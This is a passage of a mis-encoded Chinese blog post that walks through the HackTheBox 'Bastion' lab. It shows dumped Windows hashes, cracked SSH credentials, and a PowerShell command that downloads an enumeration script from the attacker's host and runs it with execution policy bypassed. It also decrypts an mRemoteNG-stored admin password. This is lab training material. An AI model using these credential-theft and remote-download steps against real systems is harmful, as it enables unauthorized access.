<p>ÂÖ≥‰∫éÂìàÂ∏åÂÄºÁöÑÂà©Áî®ÊñπÊ≥ïÂæàÂ§öÔºåÊó¢ÁÑ∂SMBÊòØÂºÄÁùÄÁöÑ ÂÆåÂÖ®ÂèØ‰ª•Áî®ÂìàÂ∏åÂÄº‰º†ÈÄíÊîªÂáª ÁôªÂΩïÁ≥ªÁªü„ÄÇ<br>‰∏™‰∫∫ÂéüÂõ† ÊàëÊØîËæÉÂñúÊ¨¢Â∞ùËØïÁ†¥Ëß£ÂØÜÁ†Å</p>
<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>Ê≥®ÊÑèËøôËæπ administratorÂíå GuestÊòæÂæóÁöÑÊòØ <strong>disable</strong><br>Ê≠£Â∏∏Êù•ËØ¥Ê†ºÂºèÊòØ<br>&lt;Áî®Êà∑Âêç&gt;:&lt;Áî®Êà∑ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;ÁïôË®Ä&gt;:&lt;‰∏ªÁõÆÂΩï&gt;<br>AdministratorÂíåguestÁöÑ LM HASHÂíåNT hashÈÉΩÊòØ‰∏ÄÊ®°‰∏ÄÊ†∑„ÄÇ<br>ËøôËæπË¶ÅÊ≥®ÊÑè aad3 Âíå 31d6 ÈÉΩÊòØ‰ª£Ë°®‰∏∫Á©∫ËØ¥ÊòéËøôÈáåÊ≤°ÊúâÊï∞ÂÄº<br>È¢òÂ§ñËØù„ÄÇ</p>
<p>Êàë‰ª¨ÊääL4mpje ÁöÑÂìàÂ∏åÂÄº‰∏¢Âà∞crackstation.net ËøõË°åÁ†¥Ëß£<br>ÂæóÂà∞Â∏êÂè∑ÂØÜÁ†Å<br>L4mpjeÔºöbureaulampje</p>
<p><img src="/images/placeholder.png" alt="Âú®Ëøôsadad" data-src="/images/HTB-bastion/20200110020035505.png" class="lazyload"></p>
<p>ÂæàÂèØÊÉú Êàë‰ª¨Ê≤°Êúâ RDPÔºå ‰ΩÜÊàë‰ª¨ÊúâSSHÔºàÁãóÂ§¥Ôºâ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>ÊàêÂäüÊãøÂà∞ cmd shell<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/HTB-bastion/20200110020241609.png" class="lazyload"><br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/HTB-bastion/20200110020309865.png" class="lazyload"><br>Áé∞Âú®ÂºÄÂßãÂáÜÂ§áÊèêÊùÉ„ÄÇ<br>Á¢∞Âà∞windows Êàë‰∏™‰∫∫‰π†ÊÉØÊòØ‰∏äJAWL ÁöÑËÑöÊú¨Êù•ÁúãÁ≥ªÁªüÁöÑ‰ø°ÊÅØÊù•Â∏ÆÂä©ÊàëÊèêÊùÉ„ÄÇ</p>
<p>ÈìæÊé•: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl githubÂú∞ÂùÄ</a></p>
<p>Âõ†‰∏∫ËøôÊòØÊàëÁöÑÁ¨¨‰∏Ä‰∏™ÊñáÁ´† ÊàëÂ∞±ÁÆÄÂçïÁöÑËØ¥‰∏ã Â¶Ç‰ΩïÂú®windowsÈáå‰º†ËæìÊñá‰ª∂<br>ÂÖ∂ÂÆûÊñπÂºèÊúâÂæàÂ§öÁßçÔºå<br>ÊúâÁöÑÊÉÖÂÜµËøô‰∏™ÂèØ‰ª• ÊúâÁöÑÊÉÖÂÜµÈÇ£‰∏™ÂèØ‰ª•<br>ÊàëÂ∞±ÁÆÄÂçïËØ¥‰∏Ä‰∏ã Êàë‰∏™‰∫∫ÂñúÁà±ÁöÑ‰∏Ä‰∏™ÊñπÊ≥ï„ÄÇ<br><strong>powershell</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1','C:\Users\L4mpje\Desktop\jaws-enum.ps1')</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>È¢òÂ§ñËØùÁªìÊùü</p>
<p>ÊâßË°åjaws-enum.ps1</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>Â§ßÊ¶ÇÁöÑÁúã‰∫Ü‰∏ã Âπ∂Ê≤°Êúâ‰ªÄ‰πàÊúâË∂£ÁöÑ‰ø°ÊÅØÔºå‰ΩÜÊúâ‰∏Ä‰∏™Âú∞ÊñπÂºïËµ∑‰∫ÜÂÖ≥Ê≥®<br><strong>mRemoteNG</strong><br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/HTB-bastion/20200110020826900.png" class="lazyload"></p>
<h2 id="ÂõõÔºåÊèêÊùÉ"><a href="#ÂõõÔºåÊèêÊùÉ" class="headerlink" title="ÂõõÔºåÊèêÊùÉ"></a>ÂõõÔºåÊèêÊùÉ</h2><p>Á¢∞Âà∞ÈôåÁîüÁöÑËΩØ‰ª∂Â∞±Ë¶Å‰∏äGoogleËØ¢ÈóÆÔºåÊûúÁÑ∂Êàë‰ª¨ÂèëÁé∞‰∫ÜËøôËΩØ‰ª∂Â≠òÂú®ÊØîËæÉÂº±ÁöÑÂØÜÁ†Å‰øùÊä§ÁÆ°ÁêÜ„ÄÇ<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèísad" data-src="/images/HTB-bastion/20200110021000221.png" class="lazyload"><br>Âú®Âè¶Â§ñ‰∏ÄÁØáÊñáÁ´†Èáå Êàë‰ª¨ÂèëÁé∞‰∫ÜÂÇ®Â≠òÂØÜÁ†ÅÁöÑÁõÆÂΩï ÊòØ‰Ωç‰∫éAppdataÈáå„ÄÇ</p>
<p>ÈìæÊé•:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">ÊñáÁ´†‰º†ÈÄÅÈó®</a></p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021043792.png" class="lazyload"><br>ËøôÈáåÂÜçËØ¥ÁÇπÈ¢òÂ§ñËØù„ÄÇ<br>AppdataÂ±û‰∫éÈöêËóèÁöÑÊñá‰ª∂Â§πÁ±ªÂûã Ê≠£Â∏∏ÁöÑdir ÊòØÊó†Ê≥ïÁúãËßÅÊñá‰ª∂Â§π</p>
<p><img src="/images/placeholder.png" alt="sadfasdfaf" data-src="/images/HTB-bastion/20200110021237568.png" class="lazyload"></p>
<p>Âà©Áî® <strong>dir/a</strong> Êù•ÊòæÁ§∫ÂÖ®ÈÉ®ÁöÑÊñá‰ª∂</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021316395.png" class="lazyload"></p>
<p>ÊàêÂäüÊâæÂà∞ÁÆ°ÁêÜÂëòÁöÑÂØÜÁ†Å</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/HTB-bastion/20200110021405254.png" class="lazyload"></p>
<p>Âà©Áî®github‰∏äÈù¢ÁöÑ‰∏Ä‰∏™python ËÑöÊú¨ Êù•ÁÆóÂá∫ÂØÜÁ†Å</p>
<p>ÈìæÊé•:github‰º†ÈÄÅÈó®</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span></span><br><span class="line"></span><br><span class="line">ÊàêÂäüÂèñÂæóÂØÜÁ†Å</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/HTB-bastion/20200110021514274.png" class="lazyload"></p>
<p>Á¥ßÊé•ÁùÄ SSHÁôªÈôÜÁÆ°ÁêÜÂëò Âπ∂ÊãøÂà∞root.txt</p>
<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/HTB-bastion/20200110021619237.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/10/HTB-bastion/">Continue</a> 	
	</div>	
    
</article>

	
	

	
	
 
   <nav class="paginator">
    
        <a class="prev" href="/page/3/"> 
            <i class="iconfont icon-left"></i>
            Prev
        </a>
    

   <span class="page-number"> Page <strong>4</strong>, Posts <strong>34</strong>. </span>

    
        <a class="next" href="/page/5/"> 
            Next
            <i class="iconfont icon-right"></i>
        </a>
    
  </nav> 

	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
</div>
          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			¬©
			
			2020 -
			
			2024
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>